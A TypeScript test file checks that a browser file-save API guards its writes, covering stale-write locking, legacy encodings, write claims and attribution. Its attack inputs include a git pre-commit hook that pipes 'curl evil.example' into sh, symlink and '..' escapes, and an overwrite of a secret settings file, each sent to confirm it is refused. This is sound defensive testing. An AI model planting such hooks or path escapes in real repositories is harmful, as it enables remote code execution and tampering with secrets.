/**
 * `POST /api/fs/write` — saving an edit a PERSON made in the browser.
 *
 * Reading through `/api/fs/*` is guarded by a deny-list that is explicitly not a
 * sandbox; writing cannot use that trade, so these tests pin the allow-list. They also
 * pin two properties whose absence is completely silent:
 *
 *  - the write is bracketed by a WRITE CLAIM. Without it a human save lands inside any
 *    concurrent Bash call's owned set (only shell produces undeclared writes, per
 *    `worktree-write-claims.ts`), so reverting that Bash call would also revert the
 *    person's work while looking entirely correct;
 *  - the save is attributed as `human`, not left for the watcher to classify as
 *    `external` — which would render the user's own edit as an anonymous foreign change.
 */
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Hono } from "hono";
import iconv from "iconv-lite";
import { AppError } from "../../lib/errors";

// tests/preload owns HOME and the single application DB/blob namespace. Changing
// NARRAFORK_HOME here split the evidence directory from an already imported DB.
const { fsRoutes } = await import("../fs");
const { db } = await import("../../db");
const { narrators, users } = await import("../../db/schema");
const { generateId } = await import("../../lib/id");
const { claimCount, foreignDeclaredPaths, openClaim } = await import(
	"../../services/worktree-write-claims"
);
const { worktreeTreeSnapshot } = await import("../../services/worktree-tree-snapshot");
const { safeSpawn } = await import("../../lib/spawn");
// The secret-path checker uses the same preload-isolated settings root.
const { narraforkDir } = await import("../../lib/settings");

const USER_ID = "fs-write-user";
const OTHER_USER_ID = "fs-write-other";

let workspace: string;
let outside: string;
let narratorId: string;
let foreignNarratorId: string;

function appAs(userId: string) {
	const app = new Hono();
	app.use("*", async (c, next) => {
		c.set("user", { sub: userId, role: "user", iat: 0, exp: Number.MAX_SAFE_INTEGER });
		await next();
	});
	app.route("/fs", fsRoutes);
	app.onError((error) => {
		if (error instanceof AppError) {
			return new Response(JSON.stringify({ error: error.message, code: error.code }), {
				status: error.statusCode,
				headers: { "content-type": "application/json" },
			});
		}
		return new Response(JSON.stringify({ error: String(error) }), { status: 500 });
	});
	return app;
}

async function save(
	body: Record<string, unknown>,
	userId = USER_ID,
): Promise<{ status: number; json: Record<string, unknown> }> {
	const res = await appAs(userId).request("http://localhost/fs/write", {
		method: "POST",
		headers: { "content-type": "application/json" },
		body: JSON.stringify(body),
	});
	return { status: res.status, json: (await res.json()) as Record<string, unknown> };
}

function sha256(text: string): string {
	return createHash("sha256").update(text, "utf-8").digest("hex");
}

/** `GET /fs/edit-source`, the editor's load path. */
async function editSource(
	path: string,
	userId = USER_ID,
): Promise<{ status: number; json: Record<string, unknown> }> {
	const res = await appAs(userId).request(
		`http://localhost/fs/edit-source?path=${encodeURIComponent(path)}`,
	);
	return { status: res.status, json: (await res.json()) as Record<string, unknown> };
}

beforeAll(async () => {
	const root = mkdtempSync(join(tmpdir(), "nf-fs-write-ws-"));
	workspace = join(root, "workspace");
	outside = join(root, "outside");
	mkdirSync(join(workspace, "src"), { recursive: true });
	mkdirSync(outside, { recursive: true });
	writeFileSync(join(outside, "secret.txt"), "untouched\n");

	const now = new Date().toISOString();
	for (const id of [USER_ID, OTHER_USER_ID]) {
		await db
			.insert(users)
			.values([{ id, username: id, passwordHash: "x", role: "user", createdAt: now }])
			.onConflictDoNothing();
	}

	narratorId = generateId();
	await db.insert(narrators).values({
		id: narratorId,
		cwd: workspace,
		ownerUserId: USER_ID,
		createdAt: now,
		updatedAt: now,
	});
	foreignNarratorId = generateId();
	await db.insert(narrators).values({
		id: foreignNarratorId,
		cwd: workspace,
		ownerUserId: OTHER_USER_ID,
		visibility: "private",
		createdAt: now,
		updatedAt: now,
	});
});

afterAll(() => {
	rmSync(workspace, { recursive: true, force: true });
	rmSync(outside, { recursive: true, force: true });
});

describe("writing inside the workspace", () => {
	test("creates a new file and returns its hash", async () => {
		const target = join(workspace, "src", "created.ts");
		const { status, json } = await save({ path: target, content: "hello\n", narratorId });

		expect(status).toBe(200);
		expect(json.hash).toBe(sha256("hello\n"));
		expect(readFileSync(target, "utf-8")).toBe("hello\n");
	});

	test("creates missing parent directories", async () => {
		const target = join(workspace, "fresh", "deep", "x.ts");
		const { status } = await save({ path: target, content: "x\n", narratorId });

		expect(status).toBe(200);
		expect(readFileSync(target, "utf-8")).toBe("x\n");
	});

	test("overwrites an existing file when the base hash matches", async () => {
		const target = join(workspace, "src", "update.ts");
		writeFileSync(target, "v1\n");
		const { status } = await save({
			path: target,
			content: "v2\n",
			narratorId,
			baseHash: sha256("v1\n"),
		});

		expect(status).toBe(200);
		expect(readFileSync(target, "utf-8")).toBe("v2\n");
	});
});

describe("the optimistic lock", () => {
	test("refuses a stale write and returns the live content for a diff", async () => {
		// The case this exists for: an agent wrote the file after the editor loaded it.
		// Overwriting would silently destroy that work.
		const target = join(workspace, "src", "raced.ts");
		writeFileSync(target, "agent wrote this\n");

		const { status, json } = await save({
			path: target,
			content: "human version\n",
			narratorId,
			baseHash: sha256("what the editor loaded\n"),
		});

		expect(status).toBe(409);
		expect(json.code).toBe("STALE_WRITE");
		// Both are needed for the client to render a diff rather than only an error.
		expect(json.currentContent).toBe("agent wrote this\n");
		expect(json.currentHash).toBe(sha256("agent wrote this\n"));
		// The file must be untouched.
		expect(readFileSync(target, "utf-8")).toBe("agent wrote this\n");
	});

	test("refuses a create whose target already exists", async () => {
		// No baseHash means "I am creating this". The premise is already false, so
		// overwriting would be a silent clobber.
		const target = join(workspace, "src", "exists.ts");
		writeFileSync(target, "already here\n");

		const { status, json } = await save({ path: target, content: "new\n", narratorId });

		expect(status).toBe(409);
		expect(json.code).toBe("STALE_WRITE");
		expect(readFileSync(target, "utf-8")).toBe("already here\n");
	});

	/**
	 * THE CONFLICT BODY MUST NOT BECOME A READ CHANNEL.
	 *
	 * A 409 returns the file's full current content, which is what makes it a diff rather
	 * than a bare failure — but it means "send a deliberately wrong baseHash" is a way to
	 * READ a file through the WRITE route, which never calls
	 * `assertReadableThroughFileApi`. What keeps that safe is ordering, not the response
	 * shape: `checkWriteBoundary` refuses every credential path BEFORE the lock is
	 * consulted, so no secret file can reach the branch that echoes content.
	 *
	 * Pinned because the guarantee is invisible at the 409 site: someone reordering the
	 * boundary check below the lock would turn this into a credential disclosure while
	 * every existing test still passed.
	 */
	test("a secret path is refused before the conflict body can echo it", async () => {
		// The real `settings.json` is deliberately NOT read here, by this test or by the
		// route: asserting on its bytes would put the live JWT secret in test output. The
		// property under test is that the response carries no content at all.
		const target = join(narraforkDir, "settings.json");

		// A wrong baseHash is what would trigger the content-returning branch.
		const { status, json } = await save({
			path: target,
			content: "pwned\n",
			narratorId,
			baseHash: sha256("not the real content\n"),
		});

		// 403 from the boundary, NOT 409 from the lock.
		expect(status).toBe(403);
		expect(json.code).toBe("WRITE_REFUSED");
		// The assertion that matters: no bytes of the file came back, under any key.
		expect(json.currentContent).toBeUndefined();
		expect(json.currentHash).toBeUndefined();
		expect(Object.keys(json).sort()).toEqual(["code", "error"]);
	});
});

describe("encoding round-trips", () => {
	// The failure these exist for is silent and total: loading a GBK file as UTF-8 turns
	// every un-decodable byte into U+FFFD, and the next save writes those replacement
	// characters back over the whole file — including the regions nobody edited.
	test("edit-source reports the detected encoding instead of assuming UTF-8", async () => {
		const target = join(workspace, "src", "legacy.txt");
		// Enough Chinese text for chardet to reach its confidence threshold.
		writeFileSync(target, iconv.encode("中文内容测试，编码检测需要足够的样本。\n", "gbk"));

		const { status, json } = await editSource(target);

		expect(status).toBe(200);
		// Not pinned to the exact name: chardet answers `gb18030` for GBK bytes, which is
		// the byte-compatible superset and decodes this content identically. What the
		// assertion is about is that it did NOT answer `utf-8` — that is the value which
		// would send the editor mojibake and have it save the mojibake back.
		expect(String(json.encoding).toLowerCase()).not.toBe("utf-8");
		// Decoded, not mojibake: no replacement characters survived the read.
		expect(String(json.content)).toContain("中文内容测试");
		expect(String(json.content)).not.toContain("\uFFFD");
	});

	test("a save writes the file back in its original encoding", async () => {
		const target = join(workspace, "src", "legacy-save.txt");
		writeFileSync(target, iconv.encode("原始内容，需要足够长的中文样本来检测编码。\n", "gbk"));

		const loaded = await editSource(target);
		const { status } = await save({
			path: target,
			content: "修改后的内容，仍然是中文。\n",
			narratorId,
			baseHash: loaded.json.hash,
			encoding: loaded.json.encoding,
		});

		expect(status).toBe(200);
		// The decisive assertion: the bytes on disk are still GBK. Reading them as UTF-8
		// would show mojibake, which is exactly what the old preview-based path produced.
		const bytes = readFileSync(target);
		expect(iconv.decode(bytes, "gbk")).toBe("修改后的内容，仍然是中文。\n");
		expect(bytes.includes(0xef)).toBe(false);
	});

	test("the optimistic lock survives a legacy encoding", async () => {
		// The regression this pins: hashing UTF-8-decoded bytes on the server while the
		// editor was served GBK-decoded text makes every save on a legacy file look like
		// a conflict, and the file becomes permanently unsaveable.
		const target = join(workspace, "src", "legacy-lock.txt");
		writeFileSync(target, iconv.encode("锁定测试，需要足够的中文样本触发检测。\n", "gbk"));

		const loaded = await editSource(target);
		const { status } = await save({
			path: target,
			content: "新内容。\n",
			narratorId,
			baseHash: loaded.json.hash,
			encoding: loaded.json.encoding,
		});

		expect(status).toBe(200);
	});
});

describe("files that cannot be edited as text", () => {
	test("edit-source refuses a binary file rather than mangling it", async () => {
		// Text in, text out does not round-trip binary: a decode/re-encode cycle would
		// rewrite the file. Refused so the UI can disable editing instead of offering a
		// save that destroys it.
		const target = join(workspace, "src", "blob.bin");
		writeFileSync(target, Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0x02, 0x03]));

		const { status, json } = await editSource(target);

		expect(status).toBe(415);
		expect(json.code).toBe("BINARY");
	});

	test("a save to a binary file is refused even if the client asks", async () => {
		// The route does not trust the client to have consulted `/edit-source` first.
		const target = join(workspace, "src", "blob-save.bin");
		writeFileSync(target, Buffer.from([0x00, 0x01, 0x02, 0x03]));

		const { status } = await save({
			path: target,
			content: "text",
			narratorId,
			baseHash: "0".repeat(64),
		});

		expect(status).toBe(400);
		expect(readFileSync(target)).toEqual(Buffer.from([0x00, 0x01, 0x02, 0x03]));
	});

	test("edit-source refuses a file above the editable cap", async () => {
		// A buffer that could not be loaded in full must not be saveable: saving it
		// would truncate the file to whatever the editor happened to show.
		const target = join(workspace, "src", "huge.txt");
		writeFileSync(target, "x".repeat(1024 * 1024 + 10));

		const { status, json } = await editSource(target);

		expect(status).toBe(413);
		expect(json.code).toBe("TOO_LARGE_TO_EDIT");
	});
});

describe("body validation", () => {
	test("malformed JSON is a 400, not an unhandled 500", async () => {
		// `c.req.json()` throws a raw SyntaxError, which is not an AppError and would
		// otherwise surface as a server fault for what is a client bug.
		const res = await appAs(USER_ID).request("http://localhost/fs/write", {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: "{not json",
		});

		expect(res.status).toBe(400);
	});

	test("a baseHash that is not a sha256 is refused", async () => {
		const { status } = await save({
			path: join(workspace, "src", "badhash.ts"),
			content: "x\n",
			narratorId,
			baseHash: "nonsense",
		});

		expect(status).toBe(400);
	});
});

describe("the write allow-list", () => {
	test("returns 409 NEEDS_CONFIRMATION for a path outside the workspace", async () => {
		const target = join(outside, "secret.txt");
		const { status, json } = await save({
			path: target,
			content: "pwned\n",
			narratorId,
			baseHash: sha256("untouched\n"),
		});

		expect(status).toBe(409);
		expect(json.code).toBe("NEEDS_CONFIRMATION");
		expect(json.reason).toBe("outside-allowed-roots");
		// Must include the physical path so the confirmation dialog shows it.
		expect(json.physicalPath).toBeTruthy();
		// The file must be untouched.
		expect(readFileSync(target, "utf-8")).toBe("untouched\n");
	});

	test("allows a write outside the workspace when confirmOutsideRoots is true", async () => {
		const target = join(outside, "confirmed-write.txt");
		writeFileSync(target, "before\n");
		const { status, json } = await save({
			path: target,
			content: "after\n",
			narratorId,
			baseHash: sha256("before\n"),
			confirmOutsideRoots: true,
		});

		expect(status).toBe(200);
		expect(json.ok).toBe(true);
		expect(readFileSync(target, "utf-8")).toBe("after\n");
	});

	test("refuses a symlink that escapes the workspace", async () => {
		// `writeFile` follows links, so a lexical check alone would permit a write to
		// `outside/secret.txt` here.
		const link = join(workspace, "escape.txt");
		symlinkSync(join(outside, "secret.txt"), link);
		try {
			const { status } = await save({
				path: link,
				content: "pwned\n",
				narratorId,
				baseHash: sha256("untouched\n"),
			});

			expect(status).toBe(403);
			expect(readFileSync(join(outside, "secret.txt"), "utf-8")).toBe("untouched\n");
		} finally {
			rmSync(link, { force: true });
		}
	});

	test("refuses a `..` traversal with 409 when confirmable", async () => {
		const { status, json } = await save({
			path: join(workspace, "..", "outside", "secret.txt"),
			content: "pwned\n",
			narratorId,
			baseHash: sha256("untouched\n"),
		});

		// A `..` traversal that lands on a real non-secret file is confirmable.
		expect(status).toBe(409);
		expect(json.code).toBe("NEEDS_CONFIRMATION");
	});

	test("confirmOutsideRoots cannot override a secret-path refusal", async () => {
		// If the boundary code ran the outside-roots check before the secret check,
		// this flag would let a user "confirm" overwriting the JWT secret.
		//
		// Uses narraforkDir rather than process.env.NARRAFORK_HOME: the secret-path
		// checker reads `narraforkDir` which is frozen at settings module load time
		// (before the test redirects the env var), so the test must use the same value.
		const target = join(narraforkDir, "settings.json");
		const { status, json } = await save({
			path: target,
			content: "pwned\n",
			narratorId,
			confirmOutsideRoots: true,
		});

		expect(status).toBe(403);
		expect(json.code).toBe("WRITE_REFUSED");
	});

	test("a symlink that stays inside the workspace is still writable", async () => {
		// The counterpart to the escape test, and the reason `O_NOFOLLOW` is applied to the
		// RESOLVED path rather than the requested one: an in-workspace link was already
		// followed during validation, so the flag has nothing to object to. Refusing this
		// would break a legitimate layout (a link to a file elsewhere in the same repo)
		// while claiming to be a security check.
		const realFile = join(workspace, "src", "linked-target.ts");
		writeFileSync(realFile, "original\n");
		const link = join(workspace, "src", "via-link.ts");
		symlinkSync(realFile, link);
		try {
			const { status } = await save({
				path: link,
				content: "through the link\n",
				narratorId,
				baseHash: sha256("original\n"),
			});

			expect(status).toBe(200);
			// The bytes landed in the link's TARGET, which is what following a link means.
			expect(readFileSync(realFile, "utf-8")).toBe("through the link\n");
		} finally {
			rmSync(link, { force: true });
			rmSync(realFile, { force: true });
		}
	});

	test("refuses a git hook inside the workspace, and no flag overrides it", async () => {
		// The end-to-end half of the git-directory refusal. `fs-write-boundary.test.ts`
		// pins the decision function; this pins that the ROUTE acts on it, because
		// `.git/hooks/pre-commit` is the one path that is fully inside the allowed root
		// (so every containment check says yes) while a write there is executed by the
		// next commit — remote code execution as the server's user for anyone who can
		// write through one narrator.
		const target = join(workspace, ".git", "hooks", "pre-commit");
		const { status, json } = await save({
			path: target,
			content: "#!/bin/sh\ncurl evil.example | sh\n",
			narratorId,
			confirmOutsideRoots: true,
		});

		expect(status).toBe(403);
		expect(json.code).toBe("WRITE_REFUSED");
		// The file must not exist: a 403 that wrote the bytes anyway is worse than no
		// check at all, because the refusal message would say it was blocked.
		expect(existsSync(target)).toBe(false);
	});
});

describe("authorization", () => {
	test("refuses a narrator the caller cannot write", async () => {
		// The narrator supplies the writable root, so an unauthorized one would be a way
		// to borrow someone else's workspace boundary.
		const target = join(workspace, "src", "borrowed.ts");
		const { status } = await save(
			{ path: target, content: "x\n", narratorId: foreignNarratorId },
			USER_ID,
		);

		// 404, not 403: the narrator gate refuses to confirm which ids exist. Asserted
		// exactly rather than as `>= 400`, which would also pass on an unrelated 400 (a
		// rejected body, a missing field) and so would not prove the ACL ran at all.
		expect(status).toBe(404);
		// The decisive check: nothing was written either way.
		expect(existsSync(target)).toBe(false);
	});

	test("requires a narrator id at all", async () => {
		const { status } = await save({ path: join(workspace, "src", "orphan.ts"), content: "x\n" });

		expect(status).toBe(400);
	});
});

describe("write claims and attribution", () => {
	test("declares the path so a concurrent shell call cannot claim it", async () => {
		// The silent failure this prevents: an undeclared human save is indistinguishable
		// from a shell command's own write, so reverting that command would revert it too.
		const target = join(workspace, "src", "claimed.ts");
		const before = claimCount(workspace);

		// A neighbouring Bash call opens its window BEFORE the save and is still running.
		openClaim(workspace, foreignNarratorId, "bash-neighbour", null);
		const { status } = await save({ path: target, content: "human\n", narratorId });
		expect(status).toBe(200);

		// From the shell call's point of view the saved path is now foreign-declared, so
		// its own owned set will exclude it.
		const foreign = foreignDeclaredPaths(
			workspace,
			foreignNarratorId,
			"bash-neighbour",
			Date.now() - 60_000,
			Date.now(),
		);
		expect([...foreign]).toContain("src/claimed.ts");
		// The claim was closed, not leaked: an open claim shadows every future window.
		expect(claimCount(workspace)).toBeGreaterThan(before);
	});

	test("records a human attribution naming the user, not a narrator", async () => {
		const target = join(workspace, "src", "attributed.ts");
		await save({ path: target, content: "line one\nline two\n", narratorId });

		const rows = await db.query.fileAttributions.findMany();
		const row = rows.find((r) => r.filePath === "src/attributed.ts");

		expect(row?.action).toBe("human");
		// A person is not a session: claiming the narrator would present this as agent work.
		expect(row?.narratorId).toBeNull();
		expect(row?.userId).toBe(USER_ID);
	});

	test("measures line stats for the save", async () => {
		const target = join(workspace, "src", "counted.ts");
		writeFileSync(target, "a\nb\n");
		await save({
			path: target,
			content: "a\nb\nc\n",
			narratorId,
			baseHash: sha256("a\nb\n"),
		});

		const rows = await db.query.fileAttributions.findMany();
		const row = rows.find((r) => r.filePath === "src/counted.ts");

		// A real measurement, not NULL: one line was appended.
		expect(row?.linesAdded).toBe(1);
	});
});

/**
 * A human save must leave a TREE SNAPSHOT BOUNDARY of its own.
 *
 * Tree hashes are captured around agent tool calls, and a save is not one. Without a
 * boundary here the saved bytes fall inside whichever window the next tool opens, and
 * two things follow that no test would otherwise catch:
 *
 *   - reverting that tool call also reverts the person's edit;
 *   - `_lastTreeHash` is reused as the next tool's `before`, and segment planning tests
 *     `previous.after === next.before` to decide "nothing else wrote in between" — so a
 *     stale `before` can merge two segments and reverse work that landed between them.
 *
 * The watcher does eventually capture one, but it polls by default and a same-size edit
 * to an already-dirty file keeps its status signature identical, so the boundary can wait
 * for the ~1-minute sweep.
 */
describe("the tree snapshot boundary", () => {
	let repo: string;
	let repoNarratorId: string;

	beforeAll(async () => {
		// A real git worktree: `tryCapture` needs one, and the workspace above is not.
		repo = mkdtempSync(join(tmpdir(), "nf-fs-write-repo-"));
		mkdirSync(join(repo, "src"), { recursive: true });
		await safeSpawn({ cmd: ["git", "init"], cwd: repo, timeout: 15_000 });
		await safeSpawn({ cmd: ["git", "config", "user.email", "test@example.com"], cwd: repo });
		await safeSpawn({ cmd: ["git", "config", "user.name", "Test"], cwd: repo });

		const now = new Date().toISOString();
		repoNarratorId = generateId();
		await db.insert(narrators).values({
			id: repoNarratorId,
			cwd: repo,
			ownerUserId: USER_ID,
			visibility: "private",
			createdAt: now,
			updatedAt: now,
		});
	});

	afterAll(() => {
		rmSync(repo, { recursive: true, force: true });
	});

	test("captures a tree that contains the saved bytes", async () => {
		const target = join(repo, "src", "bounded.ts");
		const { status } = await save({
			path: target,
			content: "saved by a person\n",
			narratorId: repoNarratorId,
		});
		expect(status).toBe(200);

		// The boundary the route took, read back from the shadow repository. Captured
		// again here only to obtain the hash — `capture` is deduplicated by content, so
		// this returns the same tree the save recorded.
		const treeHash = await worktreeTreeSnapshot.tryCapture(repo);
		expect(treeHash).toBeTruthy();
		if (!treeHash) throw new Error("expected a tree hash");

		// The assertion that matters: the recorded tree holds the saved content, so a
		// restore to this boundary reproduces the person's edit rather than losing it.
		const restored = await worktreeTreeSnapshot.readFileAtTree(repo, treeHash, "src/bounded.ts");
		expect(restored).toBe("saved by a person\n");
	});

	test("the save is a boundary of its own, separating it from what follows", async () => {
		const target = join(repo, "src", "sequenced.ts");
		await save({ path: target, content: "first\n", narratorId: repoNarratorId });
		const afterSave = await worktreeTreeSnapshot.tryCapture(repo);

		// Something else writes afterwards, the way a tool would.
		writeFileSync(join(repo, "src", "by-a-tool.ts"), "tool wrote this\n");
		const afterTool = await worktreeTreeSnapshot.tryCapture(repo);

		// Two distinct trees: the save's own state is addressable, so a revert of the
		// later write can land on it instead of undoing the save too.
		expect(afterSave).toBeTruthy();
		expect(afterTool).not.toBe(afterSave);
		// And the save's tree does NOT contain the tool's file.
		if (!afterSave) throw new Error("expected a tree hash");
		const leaked = await worktreeTreeSnapshot.readFileAtTree(repo, afterSave, "src/by-a-tool.ts");
		expect(leaked).toBeNull();
	});

	test("a failed boundary does not fail the save", async () => {
		// The bytes are already on disk when the boundary is attempted, so a snapshot
		// problem must never surface as a write failure. Exercised through a narrator
		// whose cwd is not a git repository at all, which is what `tryCapture` refuses.
		const target = join(workspace, "src", "no-repo.ts");
		const { status, json } = await save({ path: target, content: "still saved\n", narratorId });

		expect(status).toBe(200);
		expect(json.ok).toBe(true);
		expect(readFileSync(target, "utf-8")).toBe("still saved\n");
	});
});
